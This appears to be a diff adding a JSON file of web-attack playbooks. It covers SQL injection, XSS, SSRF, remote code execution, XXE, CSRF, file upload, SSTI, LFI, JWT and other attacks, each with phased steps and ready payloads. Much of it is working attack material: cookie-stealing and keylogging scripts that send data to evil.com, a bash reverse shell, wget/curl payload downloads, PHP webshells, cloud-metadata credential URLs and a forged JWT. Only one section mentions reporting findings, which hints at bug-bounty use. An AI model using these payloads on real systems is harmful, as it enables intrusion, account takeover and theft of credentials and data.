@@ -1,0 +1,792 @@
+{
+  "playbooks": {
+    "sql_injection": {
+      "name": "SQL Injection Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Inject single quotes and observe error messages",
+            "Test boolean conditions (1=1, 1=2) and compare responses",
+            "Use time-based blind techniques (SLEEP, WAITFOR, pg_sleep)",
+            "Test UNION-based injection with ORDER BY to determine columns",
+            "Check for stacked queries support"
+          ],
+          "payloads": {
+            "detection": ["' OR '1'='1", "' AND '1'='2", "1' ORDER BY 100--", "'; WAITFOR DELAY '0:0:5'--"],
+            "union": ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT 1,2,3--"],
+            "blind": ["' AND SUBSTRING((SELECT database()),1,1)='a'--", "' AND (SELECT COUNT(*) FROM users)>0--"]
+          }
+        },
+        "2_enumeration": {
+          "steps": [
+            "Extract database version and type",
+            "Enumerate databases and tables",
+            "Identify column names and data types",
+            "Extract sensitive data from target tables",
+            "Map database structure for privilege escalation"
+          ],
+          "payloads": {
+            "version": ["@@version", "version()", "banner"],
+            "databases": ["SELECT schema_name FROM information_schema.schemata", "SELECT name FROM master..sysdatabases"],
+            "tables": ["SELECT table_name FROM information_schema.tables WHERE table_schema='db'", "SHOW TABLES"],
+            "columns": ["SELECT column_name FROM information_schema.columns WHERE table_name='users'"]
+          }
+        },
+        "3_exploitation": {
+          "steps": [
+            "Extract user credentials",
+            "Read sensitive files via LOAD_FILE/UTL_FILE",
+            "Write webshell to filesystem if possible",
+            "Escalate privileges within database",
+            "Pivot to other systems using database links"
+          ],
+          "payloads": {
+            "file_read": ["' UNION SELECT LOAD_FILE('/etc/passwd')--", "'; EXEC xp_cmdshell 'type C:\\windows\\win.ini'--"],
+            "file_write": ["' INTO OUTFILE '/var/www/html/shell.php'--", "UTL_HTTP.REQUEST('http://attacker.com/'||user)--"]
+          }
+        }
+      }
+    },
+    "xss_attack": {
+      "name": "Cross-Site Scripting Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Test input reflection in page source",
+            "Check for Content-Security-Policy headers",
+            "Identify HTML context (attribute, tag, JS, CSS)",
+            "Test filter bypasses (case, encoding, tags)",
+            "Check for DOM-based XSS sinks"
+          ],
+          "payloads": {
+            "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
+            "filter_bypass": ["<ScRiPt>alert(1)</ScRiPt>", "<img/src=x onerror=alert(1)>", "javascript:alert(1)"],
+            "dom": ["#<script>alert(1)</script>", "javascript:void(document.cookie)"]
+          }
+        },
+        "2_escalation": {
+          "steps": [
+            "Bypass input validation filters",
+            "Achieve event handler injection",
+            "Test for mutation XSS (mXSS)",
+            "Check for partial context injection",
+            "Test SVG and math element vectors"
+          ],
+          "payloads": {
+            "advanced": ["<math><mtext><table><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>"],
+            "svg": ["<svg/onload=alert(1)>", "<svg><script>alert(1)</script></svg>"],
+            "template": ["${7*7}", "{{7*7}}", "<%= 7*7 %>"]
+          }
+        },
+        "3_impact": {
+          "steps": [
+            "Steal session cookies",
+            "Perform actions as victim",
+            "Redirect to phishing page",
+            "Keylogging and form theft",
+            "Cryptocurrency mining"
+          ],
+          "payloads": {
+            "cookies": ["document.location='http://evil.com/?c='+document.cookie"],
+            "phishing": ["location='https://legitimate.com/login?redirect=http://evil.com'"],
+            "keylogger": ["document.onkeypress=function(e){fetch('http://evil.com/k?k='+e.key)}"]
+          }
+        }
+      }
+    },
+    "ssrf_attack": {
+      "name": "Server-Side Request Forgery Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Identify URL input parameters",
+            "Test with internal IPs (127.0.0.1, 169.254.169.254)",
+            "Check for DNS rebinding vulnerabilities",
+            "Test protocol handlers (file://, gopher://, dict://)",
+            "Verify response differences for internal vs external"
+          ],
+          "payloads": {
+            "internal": ["http://127.0.0.1", "http://localhost", "http://169.254.169.254"],
+            "cloud": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/"],
+            "protocols": ["file:///etc/passwd", "gopher://127.0.0.1:25/", "dict://127.0.0.1:6379/"]
+          }
+        },
+        "2_bypass": {
+          "steps": [
+            "Bypass IP restrictions with DNS rebinding",
+            "Use URL encoding and double encoding",
+            "Redirect bypass for URL validation",
+            "IPv6 and alternative IP representations",
+            "Domain alias techniques"
+          ],
+          "payloads": {
+            "redirect": ["http://attacker.com/redirect?to=http://169.254.169.254"],
+            "dns_rebinding": ["http://rebind.owasp.org/ip/169.254.169.254"],
+            "encoding": ["http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/"]
+          }
+        },
+        "3_exploitation": {
+          "steps": [
+            "Access cloud metadata endpoints",
+            "Read local files via file:// protocol",
+            "Scan internal network services",
+            "Interact with internal APIs",
+            "Exfiltrate sensitive data"
+          ],
+          "payloads": {
+            "aws": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+            "gcp": ["http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"],
+            "azure": ["http://169.254.169.254/metadata/instance?api-version=2021-02-01"]
+          }
+        }
+      }
+    },
+    "idor_attack": {
+      "name": "IDOR Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Map all endpoints with object references",
+            "Identify ID patterns (sequential, UUID, hash)",
+            "Test with different user sessions",
+            "Check for authorization header manipulation",
+            "Test API parameter variations"
+          ],
+          "payloads": {
+            "sequential": ["id=1", "id=2", "id=100", "user_id=other_user_id"],
+            "headers": ["X-User-ID: other_user", "Authorization: Bearer other_user_token"]
+          }
+        },
+        "2_bypass": {
+          "steps": [
+            "Parameter pollution techniques",
+            "HTTP method manipulation (GET vs POST)",
+            "Content-Type switching",
+            "Wildcard and null byte injection",
+            "Encoded parameter values"
+          ],
+          "payloads": {
+            "methods": ["GET /api/user/1 -> POST /api/user/1", "GET /api/user/1 -> PUT /api/user/1"],
+            "wildcards": ["id=*", "id=..%2f..%2f"]
+          }
+        },
+        "3_exploitation": {
+          "steps": [
+            "Enumerate accessible objects",
+            "Extract sensitive user data",
+            "Modify unauthorized records",
+            "Perform actions as other users",
+            "Chain with other vulnerabilities"
+          ]
+        }
+      }
+    },
+    "rce_attack": {
+      "name": "Remote Code Execution Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Identify command injection points",
+            "Test for unsafe deserialization",
+            "Check for template injection",
+            "Evaluate file upload restrictions",
+            "Test eval/exec function parameters"
+          ],
+          "payloads": {
+            "command": ["; id", "| id", "`id`", "$(id)"],
+            "deserialization": ["rO0ABXNy...", "O:8:\"stdClass\":0:{}"],
+            "template": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]
+          }
+        },
+        "2_bypass": {
+          "steps": [
+            "Bypass space restrictions",
+            "Avoid special character filters",
+            "Use variable substitution",
+            "Exploit blind injection with out-of-band",
+            "Chain with file upload for webshell"
+          ],
+          "payloads": {
+            "no_space": ["{id}", "$IFS", "%09", "cat${IFS}/etc/passwd"],
+            "bypass": ["ca''t /etc/passwd", "c${x}at /etc/passwd"]
+          }
+        },
+        "3_post_exploitation": {
+          "steps": [
+            "Establish reverse shell",
+            "Read sensitive files",
+            "Escalate privileges",
+            "Pivot to other systems",
+            "Establish persistence"
+          ],
+          "payloads": {
+            "shell": ["bash -i >& /dev/tcp/attacker/4444 0>&1", "python -c 'import socket,os;...'"],
+            "download": ["wget http://evil.com/shell.sh", "curl -o shell.sh http://evil.com/shell.sh"]
+          }
+        }
+      }
+    },
+    "auth_bypass": {
+      "name": "Authentication Bypass Attack Playbook",
+      "phases": {
+        "1_enumeration": {
+          "steps": [
+            "Map authentication endpoints",
+            "Identify alternative login methods",
+            "Check for default credentials",
+            "Test password reset flow",
+            "Analyze session management"
+          ]
+        },
+        "2_bypass_techniques": {
+          "steps": [
+            "SQL injection in login form",
+            "Session fixation attacks",
+            "JWT token manipulation",
+            "OAuth flow manipulation",
+            "Parameter pollution"
+          ],
+          "payloads": {
+            "jwt": ["{\"alg\":\"none\"}", "{\"typ\":\"JWT\",\"alg\":\"none\"}"],
+            "oauth": ["redirect_uri=http://evil.com", "state=attacker_state"]
+          }
+        },
+        "3_session_hijacking": {
+          "steps": [
+            "Fixate session tokens",
+            "Intercept session cookies",
+            "Bypass session timeout",
+            "Hijack active sessions",
+            "Maintain persistent access"
+          ]
+        }
+      }
+    },
+    "privilege_escalation": {
+      "name": "Privilege Escalation Attack Playbook",
+      "phases": {
+        "1_vertical_escalation": {
+          "steps": [
+            "Enumerate user roles and permissions",
+            "Test parameter manipulation for role changes",
+            "Check for missing function-level auth",
+            "Exploit insecure direct object references",
+            "Chain with other vulnerabilities"
+          ],
+          "payloads": {
+            "role_change": ["role=admin", "is_admin=true", "privilege=high"],
+            "parameter": ["&role=1", "&admin=1", "&access_level=10"]
+          }
+        },
+        "2_horizontal_escalation": {
+          "steps": [
+            "Access other users' data",
+            "Perform actions as different users",
+            "Modify other users' settings",
+            "Extract sensitive information",
+            "Pivot to administrative functions"
+          ]
+        },
+        "3_lateral_movement": {
+          "steps": [
+            "Access internal APIs",
+            "Use compromised credentials elsewhere",
+            "Abuse trust relationships",
+            "Pivot through application logic",
+            "Escalate to system-level access"
+          ]
+        }
+      }
+    },
+    "xxe_attack": {
+      "name": "XXE Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Identify XML processing endpoints",
+            "Test with simple XXE payloads",
+            "Check for error-based XXE",
+            "Test for blind XXE with OOB techniques",
+            "Verify parser configurations"
+          ],
+          "payloads": {
+            "basic": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"],
+            "blind": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe?data=file:///etc/passwd'>]>"],
+            "svg": ["<svg xmlns='http://www.w3.org/2000/svg'><text>&xxe;</text></svg>"]
+          }
+        },
+        "2_bypass": {
+          "steps": [
+            "Bypass input filtering with parameter entities",
+            "Use UTF-8 BOM bypass",
+            "Exploit external DTD references",
+            "Use CDATA sections for data extraction",
+            "Combine with SSRF for cloud metadata"
+          ],
+          "payloads": {
+            "parameter": ["<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM 'http://attacker.com/ext.dtd'>%xxe;]>"],
+            "utf8_bom": ["﻿<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"]
+          }
+        },
+        "3_exploitation": {
+          "steps": [
+            "Read sensitive local files",
+            "Perform SSRF to internal services",
+            "Exfiltrate data via OOB channels",
+            "Denial of service via billion laughs",
+            "Remote code execution in specific configurations"
+          ]
+        }
+      }
+    },
+    "csrf_attack": {
+      "name": "CSRF Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Identify state-changing operations",
+            "Test for anti-CSRF tokens",
+            "Check SameSite cookie attributes",
+            "Verify Origin/Referer header validation",
+            "Test token predictability"
+          ]
+        },
+        "2_bypass": {
+          "steps": [
+            "Bypass token validation",
+            "Exploit subdomain XSS for token theft",
+            "Use GET requests for state changes",
+            "Bypass SameSite with top-level navigation",
+            "Exploit CORS misconfigurations"
+          ],
+          "payloads": {
+            "form": ["<form action='http://bank.com/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='1000'></form>"],
+            "image": ["<img src='http://bank.com/api/transfer?to=attacker&amount=1000'>"],
+            "xhr": ["fetch('http://bank.com/api/transfer',{method:'POST',body:'to=attacker&amount=1000',credentials:'include'})"]
+          }
+        },
+        "3_impact": {
+          "steps": [
+            "Modify user account settings",
+            "Perform financial transactions",
+            "Change email addresses",
+            "Delete user data",
+            "Escalate privileges"
+          ]
+        }
+      }
+    },
+    "file_upload_attack": {
+      "name": "File Upload Attack Playbook",
+      "phases": {
+        "1_bypass_validation": {
+          "steps": [
+            "Test allowed file types",
+            "Bypass extension filters",
+            "Modify Content-Type header",
+            "Use double extensions",
+            "Exploit null byte injection"
+          ],
+          "payloads": {
+            "extensions": ["shell.php", "shell.php.jpg", "shell.php%00.jpg", "shell.phtml"],
+            "content_type": ["Content-Type: image/jpeg", "Content-Type: application/x-php"]
+          }
+        },
+        "2_achieve_execution": {
+          "steps": [
+            "Find web-accessible upload directory",
+            "Verify uploaded file accessibility",
+            "Test for code execution",
+            "Bypass WAF/AV detection",
+            "Establish persistent access"
+          ],
+          "payloads": {
+            "webshell": ["<?php system($_GET['cmd']); ?>", "<% Runtime.getRuntime().exec(request.getParameter('cmd')); %>"],
+            "evasion": ["<?php eval($_POST['x']); ?>", "GIF89a<?php system($_GET['cmd']); ?>"]
+          }
+        },
+        "3_post_exploitation": {
+          "steps": [
+            "Execute system commands",
+            "Read sensitive files",
+            "Establish reverse shell",
+            "Pivot to other systems",
+            "Cover tracks"
+          ]
+        }
+      }
+    },
+    "subdomain_takeover": {
+      "name": "Subdomain Takeover Attack Playbook",
+      "phases": {
+        "1_enumeration": {
+          "steps": [
+            "Use passive reconnaissance tools",
+            "Check certificate transparency logs",
+            "Perform DNS brute-forcing",
+            "Analyze JavaScript files for subdomains",
+            "Check web archives for subdomains"
+          ],
+          "tools": ["subfinder", "amass", " crt.sh", " subbrute"]
+        },
+        "2_identification": {
+          "steps": [
+            "Check CNAME records for dangling entries",
+            "Verify service claim status",
+            "Test for unclaimed GitHub Pages",
+            "Check Heroku/Netlify/Vercel deployments",
+            "Verify S3 bucket ownership"
+          ],
+          "services": ["GitHub Pages", "Heroku", "Netlify", "Vercel", "AWS S3", "Azure", "Fastly", "Shopify"]
+        },
+        "3_takeover": {
+          "steps": [
+            "Claim the unclaimed service",
+            "Create content to demonstrate impact",
+            "Document proof of takeover",
+            "Report to program",
+            "Provide remediation advice"
+          ]
+        }
+      }
+    },
+    "jwt_attack": {
+      "name": "JWT Attack Playbook",
+      "phases": {
+        "1_analysis": {
+          "steps": [
+            "Decode JWT structure",
+            "Identify signing algorithm",
+            "Check for weak keys",
+            "Analyze token claims",
+            "Verify token expiration"
+          ]
+        },
+        "2_bypass": {
+          "steps": [
+            "Test none algorithm",
+            "Algorithm confusion (RS256 to HS256)",
+            "Brute-force weak signing keys",
+            "Exploit key disclosure",
+            "Token manipulation"
+          ],
+          "payloads": {
+            "none": ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."],
+            "confusion": ["Use public key as HMAC secret"]
+          }
+        },
+        "3_exploitation": {
+          "steps": [
+            "Forge admin tokens",
+            "Escalate privileges",
+            "Access protected resources",
+            "Bypass authentication",
+            "Maintain persistent access"
+          ]
+        }
+      }
+    },
+    "graphql_attack": {
+      "name": "GraphQL Attack Playbook",
+      "phases": {
+        "1_introspection": {
+          "steps": [
+            "Enable introspection query",
+            "Map complete schema",
+            "Identify queries and mutations",
+            "Check for authorization",
+            "Document data types and relationships"
+          ],
+          "payloads": {
+            "introspection": ["{__schema{types{name,fields{name}}}}"],
+            "query": ["{users{id,email,name}}"],
+            "mutation": ["mutation{updateUser(id:1,role:ADMIN){id,role}}"]
+          }
+        },
+        "2_abuse": {
+          "steps": [
+            "Batch query abuse for DoS",
+            "Recursive query exploitation",
+            "Injection in query parameters",
+            "Bypass query depth limits",
+            "Excessive data exposure"
+          ]
+        },
+        "3_exploitation": {
+          "steps": [
+            "Extract sensitive data",
+            "Modify unauthorized records",
+            "Escalate privileges",
+            "Perform denial of service",
+            "Chain with other vulnerabilities"
+          ]
+        }
+      }
+    },
+    "race_condition": {
+      "name": "Race Condition Attack Playbook",
+      "phases": {
+        "1_identification": {
+          "steps": [
+            "Identify time-sensitive operations",
+            "Map state-changing actions",
+            "Test for atomic operations",
+            "Analyze database transactions",
+            "Check for optimistic locking"
+          ]
+        },
+        "2_exploitation": {
+          "steps": [
+            "Send concurrent requests",
+            "Use multi-threaded tools",
+            "Time request synchronization",
+            "Monitor state changes",
+            "Repeat for reliability"
+          ],
+          "payloads": {
+            "concurrent": ["Burp Suite Turbo Intruder", "OWASP ZAP Concurrent Requests", "Custom multi-threaded script"]
+          }
+        },
+        "3_impact": {
+          "steps": [
+            "Double-spending in payments",
+            "Redeeming multiple coupons",
+            "Creating duplicate accounts",
+            "Exploiting voting systems",
+            "Bypassing rate limits"
+          ]
+        }
+      }
+    },
+    "cache_poisoning": {
+      "name": "Cache Poisoning Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Identify cache behavior",
+            "Test unkeyed inputs",
+            "Check for cache control headers",
+            "Analyze Vary headers",
+            "Map cache keys"
+          ]
+        },
+        "2_poisoning": {
+          "steps": [
+            "Inject unkeyed headers",
+            "Poison cache with redirects",
+            "XSS via cache poisoning",
+            "JavaScript injection",
+            "Stored cache poisoning"
+          ],
+          "payloads": {
+            "headers": ["X-Forwarded-Host: evil.com", "X-Original-URL: /admin"],
+            "xss": ["<script>alert(1)</script>"]
+          }
+        },
+        "3_impact": {
+          "steps": [
+            "Serve malicious JavaScript",
+            "Redirect all users",
+            "Phishing via cached pages",
+            "Malware distribution",
+            "Data exfiltration"
+          ]
+        }
+      }
+    },
+    "ssti_attack": {
+      "name": "SSTI Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Inject template expressions",
+            "Identify template engine",
+            "Test for error-based detection",
+            "Check for blind injection",
+            "Map template context"
+          ],
+          "payloads": {
+            "basic": ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
+            "jinja2": ["{{config.items()}}", "{{self.__class__.__mro__}}"],
+            "freemarker": ["<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"]
+          }
+        },
+        "2_bypass": {
+          "steps": [
+            "Bypass space restrictions",
+            "Avoid blacklisted characters",
+            "Use string concatenation",
+            "Exploit template inheritance",
+            "Chain with other vulnerabilities"
+          ]
+        },
+        "3_rce": {
+          "steps": [
+            "Access Python/import mechanisms",
+            "Execute system commands",
+            "Read/write files",
+            "Establish reverse shell",
+            "Pivot to other systems"
+          ],
+          "payloads": {
+            "jinja2_rce": ["{{''.__class__.__mro__[1].__subclasses__()}}"],
+            "freemarker_rce": ["<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"]
+          }
+        }
+      }
+    },
+    "lfi_attack": {
+      "name": "LFI Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Identify file inclusion parameters",
+            "Test path traversal sequences",
+            "Check for null byte injection",
+            "Test for filter bypass",
+            "Verify file read capabilities"
+          ],
+          "payloads": {
+            "traversal": ["../../../etc/passwd", "....//....//....//etc/passwd"],
+            "null_byte": ["../../../etc/passwd%00", "../../../etc/passwd%2500"],
+            "encoding": ["..%252f..%252f..%252fetc/passwd"]
+          }
+        },
+        "2_bypass": {
+          "steps": [
+            "Bypass input filters",
+            "Use null byte injection",
+            "Exploit path truncation",
+            "PHP wrapper abuse",
+            "Log poisoning"
+          ],
+          "payloads": {
+            "php_wrappers": ["php://filter/convert.base64-encode/resource=config.php", "php://input"],
+            "logs": ["/var/log/apache2/access.log", "/var/log/nginx/access.log"]
+          }
+        },
+        "3_rce": {
+          "steps": [
+            "Poison log files",
+            "Upload webshell via LFI",
+            "Use PHP wrappers for code exec",
+            "Chain with file upload",
+            "Establish persistent access"
+          ]
+        }
+      }
+    },
+    "crlf_injection": {
+      "name": "CRLF Injection Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Inject CRLF sequences in parameters",
+            "Check for response splitting",
+            "Test header injection",
+            "Verify log injection",
+            "Test redirect manipulation"
+          ],
+          "payloads": {
+            "basic": ["%0d%0aInjected-Header:value", "\r\nInjected-Header:value"],
+            "encoding": ["%E5%98%8A%E5%98%8D", "%0D%0A"]
+          }
+        },
+        "2_bypass": {
+          "steps": [
+            "Bypass input sanitization",
+            "Use Unicode line breaks",
+            "Exploit double encoding",
+            "Null byte injection",
+            "Tab and space variations"
+          ]
+        },
+        "3_exploitation": {
+          "steps": [
+            "HTTP response splitting",
+            "Cross-site scripting via headers",
+            "Cache poisoning",
+            "Session fixation",
+            "Log injection attacks"
+          ]
+        }
+      }
+    },
+    "open_redirect": {
+      "name": "Open Redirect Attack Playbook",
+      "phases": {
+        "1_detection": {
+          "steps": [
+            "Identify redirect parameters",
+            "Test with external URLs",
+            "Check for filter bypasses",
+            "Verify redirect chain behavior",
+            "Test protocol-relative URLs"
+          ],
+          "payloads": {
+            "basic": ["http://evil.com", "//evil.com", "/\\evil.com"],
+            "bypass": ["http://legitimate.com@evil.com", "http://evil.com%00.legitimate.com"]
+          }
+        },
+        "2_bypass": {
+          "steps": [
+            "Bypass allowlist checks",
+            "Use URL encoding",
+            "Exploit parser discrepancies",
+            "Use backslash and tab characters",
+            "Protocol confusion"
+          ],
+          "payloads": {
+            "encoding": ["%68%74%74%70%3a%2f%2f%65%76%69%6c%2e%63%6f%6d"],
+            "parser": ["http://evil.com%2523.legitimate.com", "http://legitimate.com\\@evil.com"]
+          }
+        },
+        "3_impact": {
+          "steps": [
+            "Phishing attacks",
+            "Credential theft",
+            "Malware distribution",
+            "OAuth token theft",
+            "Bypass WAF/security tools"
+          ]
+        }
+      }
+    },
+    "business_logic": {
+      "name": "Business Logic Attack Playbook",
+      "phases": {
+        "1_analysis": {
+          "steps": [
+            "Map business processes",
+            "Identify price/coupon logic",
+            "Analyze workflow states",
+            "Test input validation",
+            "Check for race conditions"
+          ]
+        },
+        "2_manipulation": {
+          "steps": [
+            "Modify prices in transit",
+            "Reuse coupons multiple times",
+            "Skip workflow steps",
+            "Bypass quantity checks",
+            "Exploit state transitions"
+          ],
+          "payloads": {
+            "price": ["price=-1", "discount=100", "quantity=0"],
+            "coupon": ["coupon=USED_COUPON", "reuse=true"]
+          }
+        },
+        "3_impact": {
+          "steps": [
+            "Purchase items at discounted prices",
+            "Obtain free services",
+            "Bypass payment systems",
+            "Escalate account privileges",
+            "Abuse promotional offers"
+          ]
+        }
+      }
+    }
+  }
+}
